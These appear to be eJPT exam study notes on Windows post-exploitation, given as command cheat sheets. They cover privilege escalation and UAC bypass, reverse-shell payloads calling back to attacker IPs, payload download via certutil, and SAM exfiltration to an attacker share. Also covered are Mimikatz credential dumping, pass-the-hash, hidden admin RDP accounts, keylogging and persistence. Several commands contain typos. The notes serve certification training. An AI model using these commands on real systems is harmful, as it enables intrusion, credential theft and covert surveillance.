## Windows Post Exploitation

[eJPT - Exam Notes Index](https://github.com/sedici-gith/eJPT/tree/main)

### Meterpreter
```
getsystem - try to elevate privileges
hashdump - try to download SAM database for credentials
```
### Metasploit
```
post/multi/recon/local_exploit_suggester
search win_privs - shows privileges of the account
search enum_logged_on_users - show users logged or previously logged on the system
search checkvm - check if the target is VM
search enum_applications - show installed programs
search type:post platform:windows enum_av - AntiVirus enumeration
search enum_computer - domain PC enumeration
search enum_patches - patch enumeration
search enum_shares - SMB shares enumeration
search rdp platform:windows - try to establish an RDP connection
```
## Windows Privilege Escalation

### Bypassing UAC (Meterpreter)

With the help of x64 Meterpreter session, we can try to bypass UAC employing Windows Escalation UAC Bypass.

### Meterpreter

Check if the account is an administrator. If not, we can try to elevate our privileges with the help of meterpreter's commands.
```
getuid
getsystem
getprivs
shell
net users
net local group administrator
```

We are locked out by the UAC, so we load and use this Metasploit module.
```
search bypassuac_injection
```
Then we can try again to obtain elevated privileges.
```
getuid
getsystem
getprivs
```
### Bypassing UAC with UACMe

#### UACME by hfiref0x

Downloaded the files from the repository, we can create a payload with MSFVenom.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f exe > backdoor.exe
```
### Metaslpoit
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
```
### Meterpreter
```
cd C:\\
mkdir Temp
cd Temp
upload backdoor.exe
upload /root/Desktop/tools/UACME/Akagai64.exe
shell
.\Akagai64.exe 23 C:\Temp\backdoor.exe
```
The number 23, as mentioned in the documentation, is assigned to the particular Windows version of the target machine.

The script open a new meterpreter session thanks to the multi/handler that can be used to elevate our privileges.

## Access Token Impersonation

Windows access tokens are tokens generated by the Local Security Authority Subsystem Service (LSASS). These tokens are used by network-related services to access their services without requiring the user to enter their credentials repeatedly.

To be successful, this attack needs the attacker to be in possessions of these privileges:
* SeAssignPrimaryToken - token impersonation
* SeCreateToken - it is used to create new tokens
* SeImpersonatePrivilege - it can create a process impersonating another user with elevated privileges


### Incognito Module (Meterpreter)

We need to check if among our privileges there is SeImpersonatePrivilege.
```
getprivs
```
Then we can proceed with Incognito.
```
load incognito
list_tokens -u
impersonate_token “ATTACKDEFENSE\Administrator”
pgrep explorer
migrate 1234
```
If we can’t find any useful token, we must proceed with a “potato attack.”

### Rogue Potato

Privileges needed:
* SeImpersonatePrivilege
* SeAssignPrimaryTokenPrivilege

Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:
```
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.207.177:9999
```
Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:
```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```
Start another listener on Kali.
Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):
```
C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
```
### Insecure service Permissions
```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```
In this way we use the accesschk.exe executable to take advantage of the privileges that the user has on the daclsvc service. Being able to configure the service settings, we can modify the binary path and set it to run a reverse shell generated with Msfvenom and with the help of Netcat obtain a reverse shell with administrator privileges.

### Weak Registry permissions
```
sc qc regsvc
```
```
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```
```
net start regsvc
```
With these commands, we can check if we have the necessary permissions to write to the system registry. If we do, we can then write the path for the reverse shell to execute.

### Insecure service Executables

#### Registry - AutoRuns

Enumerate AutoRuns processes.
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```
Then we can compromise the list and add a payload to be executed when an administrator login into the machine.

#### Registry - AlwaysInstallElevated
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Note that both keys are set to 1 (0x1)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```
```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```
#### Passwords - Registry

The registry can be searched for keys and values that contain the word "password":
```
reg query HKLM /f password /t REG_SZ /s
```
If you want to save some time, query this specific key to find admin AutoLogon credentials:
```
reg query "HKLM\Software\Microsoft\WindowsNT\CurrentVersion\winlogon"
```
On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
```
winexe -U 'admin%password' //10.10.207.177 cmd.exe
```
#### Passwords - Saved Credentials
```
cmdkey /list
```
```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```
exploitiamo il fatto che le credenziali siano salvate sul sistema e proviamo a far partire la reverse shell come amministratori 

### Passwords Security Account Manager (SAM)

Transfer the SAM and SYSTEM files to your Kali VM:
```
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\ copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```
On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:
```
git clone https://github.com/Tib3rius/creddump7 pip3 install pycrypto python3 creddump7/pwdump.py SYSTEM SAM
```
Crack the admin NTLM hash using hashcat:
```
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```
You can use the cracked password to log in as the admin using winexe or RDP.

## Windows Credential Dumping

Searching for password in Windows Configuration Files

Unattended Windows Setup (UWS) is an automatic configuration file used to configure multiple machines in bulk. It typically contains administrative credentials, which should be erased as soon as the machine configuration is complete.
```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Autounattend.xml
```
### Metasploit and Reverse Shell EXEC
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOSTS=10.10.10.2 LPORT=1234 -f exe > payload.exe
```
```
python -m SimpleHTTPServer 80
```
or
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
On the target machine for HTTP.
```
certutil -urlcache -f http://10.10.10.2/payload.exe payload.exe
```
For SMB server.
```
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```
On the attacker machine.
```
use multi/handler
set payload /windows/x64/metertreter/reverse_tcp
set options….
```
After executing the payload, I’ll gain access to a Meterpreter shell.
```
search -f Unattend.xml
download unattend.xml
```
If Plain text value is false, the password will be encrypted with base64.
```
base64 -d password.txt
```
We can now test the password.
```
psexec.py Administrator@10.10.10.1
```
### Dumping hashes with Mimikatz and Kiwi

Mimikatz needs administrative privileges.

#### Metaslpoit (Meterpreter) Kiwi
```
pgrep lsass
migrate 1234
load kiwi
? - help
creds_all
lsa_dump_sam
lsa_dump_secrets
cd C:\\
mkdir Temp
cd Temp
```

#### Metaslpoit (Meterpreter) Mimikatz
```
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell
mimikatz.exe
lsadump::sam - check for SysKey and SAMKey
lsadump::secrets
sekurlsa::logonpassword
```
```
lsadump::lsa /patch - hashes dump
```
#### Golden Ticket
```
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user: /domain: /sid: /krbtgt: /id: 
misc::cmd
```
### Pass-the-hash Attacks

* Metasploit PsExec module
* Crackmapexec

We need only the hashes without decryption.

#### Metaslpoit (Meterpreter)
```
pgrep lsass
migrate 1234
load kiwi
lsa_dump_sam - take note of the NTLM hash
hashdump - take note of the LM hash
```
Metaslpoit
```
search psexec
set options
set smbuser administrator
set smbpass hashNTLM:hashLM
set target Native\ upload
exploit
```
#### Crackmapexec
```
crackmapexec smb 10.10.10.1 -u Administrator -H “hashNTLM” -x “ipconfig”
```
## Windows cracking password hashes

### NTLM Hashes

#### Meterpreter
```
hashdump
john —list=formats | grep NT
john —format=NT hashes.txt
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -a 3 -m 1000 hash /usr/share/wordlists/rockyou.txt
```

## Windows - Establishing Persistence

We need a Meterpreter session.

### Metasploit
```
search platform:windows persistence_service
use multi/handler
set payload - same as persistence module
set port and host - receiving communication of persistence module
```
### Enabling RDP

How to enable RDP

#### Metasploit
```
search enable_rdp
```
We can change password using this module or we can use Meterpreter to do that.
```
shell
net users
net use administrator hacker_123321
```
#### Meterpreter
```
run getgui -e -u user1 -p hacker_123321
```
This command creates a new account with the privilege to use RDP without appearing on the login screen. Additionally, it adds the account to the administrative group.

Afterward, we can log in to the account using the RDP service.
```
xfreerdp /u:administrator /p:hacker_123321 /v:10.10.10.1
```
### Windows Key-logging

#### Meterpreter

We need to migrate to the service we need to monitor.
```
keyscan_start
keyscan_dump
keyscan_stop
```
#### Via Services

Metasploit
```
search persistence_service
options
set session
set lport 4433
```
We can configure the module to make it less noticeable. Regardless, it generates a configuration file to clean up its remnants on the target machine.
To use it, we still need the multi/handler module as usual.
